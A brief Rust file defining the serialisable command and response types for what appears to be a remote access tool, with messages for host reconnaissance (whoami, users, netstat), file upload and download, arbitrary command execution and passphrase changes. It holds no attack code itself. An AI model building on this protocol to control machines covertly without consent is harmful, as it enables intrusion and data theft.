use serde::{Serialize, Deserialize};

#[derive(Serialize, Deserialize, Debug)]
pub enum Command {
    Echo { message: String },
    ListFiles,
    Whoami,
    Info,
    Pwd,
    Users,
    Netstat,
    Network,
    GetFile { file_path: String, file_local_path: String },
    PutFile { file_path: String, file_up_path: String, data: Vec<u8> },
    Execute { command: String },
    ChangePassphrase { new_passphrase: String },
}

#[derive(Serialize, Deserialize, Debug)]
pub enum Response {
    Message { content: String },
    FileList { files: Vec<String> },
    UserList { users: Vec<String> },
    FileData { file_path: String, data: Vec<u8> },
    CommandOutput { output: String },
}